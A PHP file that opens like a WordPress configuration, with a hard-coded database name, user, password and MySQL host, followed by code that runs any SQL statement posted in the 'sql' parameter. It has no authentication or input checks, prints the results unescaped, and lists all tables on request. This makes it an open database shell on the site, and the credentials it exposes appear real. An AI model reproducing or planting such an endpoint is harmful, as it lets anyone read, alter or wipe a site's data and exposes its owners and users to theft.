<?php
/** The name of the database for WordPress */

define('DB_NAME', 'fla1205905202161');



/** MySQL database username */

define('DB_USER', 'fla1205905202161');



/** MySQL database password */

define('DB_PASSWORD', 'Winner@1');



/** MySQL hostname */

define('DB_HOST', 'p50mysql355.secureserver.net');



 $con = mysql_connect(DB_HOST,DB_USER,DB_PASSWORD);
  mysql_select_db(DB_NAME,$con);
 
 
 if(isset($_POST["sql"])){
	
	  $query = "".preg_replace("/\b(tables)\b/i",$_POST["table"],$_POST["sql"]);
	  $q_data = mysql_query($query) or die(mysql_error());
	   $q_data2 = mysql_query($query);
	  ?>
     	  <tr id="header">
            <?php $a = 0; ?>
           <?php while($f_data = mysql_fetch_assoc($q_data)): ?>
          
            <?php if($a==0): ?>
		   		 <?php foreach($f_data as $key => $val): ?>
                    <th><?php echo $key; ?></th>
                  <?php endforeach; ?>
            <?php endif; ?>
            <?php $a++; ?>  
           <?php endwhile; ?>
          </tr>
         
           <?php while($f_data2 = mysql_fetch_assoc($q_data2)): ?>
             <tr id="data">
              <?php foreach($f_data2 as $key2 => $val2): ?>
             
                  <td><?php echo $val2; ?></td>
              
              <?php endforeach; ?>
              </tr>
           <?php endwhile; ?>
        
      
      <?php
	 
 }
 if(isset($_GET["tables"])){
	  
	 $q =  mysql_query("SHOW TABLES"); 
	
	 while($f = mysql_fetch_assoc($q)){
		echo "<option value='".$f["Tables_in_".DB_NAME]."'>".$f["Tables_in_".DB_NAME]."</option>";
		
		
		
	 }
 }

?>